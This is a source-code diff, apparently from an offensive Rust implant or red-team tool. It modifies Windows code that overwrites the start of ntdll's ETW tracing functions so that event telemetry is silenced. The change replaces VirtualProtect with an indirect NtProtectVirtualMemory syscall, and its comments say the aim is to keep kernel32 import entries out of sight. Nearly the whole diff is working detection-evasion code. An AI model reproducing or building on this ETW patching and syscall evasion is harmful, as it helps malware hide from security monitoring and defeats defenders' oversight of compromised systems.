@@ -23,7 +23,8 @@
 //! platforms the functions are no-ops.
 //!
 //! No OS handles are opened: ntdll is located by walking the PEB loader list
-//! and `VirtualProtect` operates on the current process address space directly.
+//! and memory protection changes are performed via NtProtectVirtualMemory
+//! indirect syscall (no kernel32 IAT entries).
 
 #[cfg(windows)]
 use std::sync::atomic::AtomicU8;
@@ -44,8 +45,38 @@ static ORIG_NT_TRACE: AtomicU8 = AtomicU8::new(0);
 mod imp {
     use super::{ORIG_ETW_WRITE, ORIG_ETW_WRITE_EX, ORIG_NT_TRACE};
     use std::sync::atomic::Ordering;
-    use winapi::um::memoryapi::VirtualProtect;
     use winapi::um::winnt::PAGE_EXECUTE_READWRITE;
+
+    /// Change memory protection using NtProtectVirtualMemory via indirect
+    /// syscall (avoids kernel32!VirtualProtect IAT entry).  Falls back to
+    /// VirtualProtect when the `direct-syscalls` feature is disabled.
+    ///
+    /// Parameters mirror VirtualProtect for call-site convenience.
+    #[inline]
+    unsafe fn change_protect(
+        addr: *mut std::ffi::c_void,
+        size: usize,
+        new_protect: u32,
+        old_protect: &mut u32,
+    ) -> bool {
+        #[cfg(feature = "direct-syscalls")]
+        {
+            let mut base_addr = addr;
+            let mut region_size = size;
+            let status = crate::syscalls::syscall_NtProtectVirtualMemory(
+                (-1isize) as usize as u64,              // NtCurrentProcess()
+                &mut base_addr as *mut _ as usize as u64, // PVOID*  (in/out)
+                &mut region_size as *mut _ as usize as u64, // PSIZE_T (in/out)
+                new_protect as u64,
+                old_protect as *mut _ as usize as u64,     // PULONG  (out)
+            );
+            status == 0 // NTSTATUS_SUCCESS
+        }
+        #[cfg(not(feature = "direct-syscalls"))]
+        {
+            winapi::um::memoryapi::VirtualProtect(addr, size, new_protect, old_protect) != 0
+        }
+    }
 
     /// Maximum number of hook chain levels to follow before giving up.
     const MAX_HOOK_CHAIN_DEPTH: usize = 4;
@@ -115,7 +146,7 @@ mod imp {
         orig.store(first_byte, Ordering::Relaxed);
 
         let mut old_protect: u32 = 0;
-        if VirtualProtect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
+        if !change_protect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) {
             return false;
         }
 
@@ -125,7 +156,7 @@ mod imp {
         // Restore original protection.  Failure here is non-fatal: the patch
         // is already in place.
         let mut dummy: u32 = 0;
-        VirtualProtect(target as *mut _, 1, old_protect, &mut dummy);
+        change_protect(target as *mut _, 1, old_protect, &mut dummy);
 
         true
     }
@@ -145,14 +176,14 @@ mod imp {
         }
 
         let mut old_protect: u32 = 0;
-        if VirtualProtect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
+        if !change_protect(target as *mut _, 1, PAGE_EXECUTE_READWRITE, &mut old_protect) {
             return false;
         }
 
         core::ptr::write_volatile(target as *mut u8, original);
 
         let mut dummy: u32 = 0;
-        VirtualProtect(target as *mut _, 1, old_protect, &mut dummy);
+        change_protect(target as *mut _, 1, old_protect, &mut dummy);
 
         true
     }
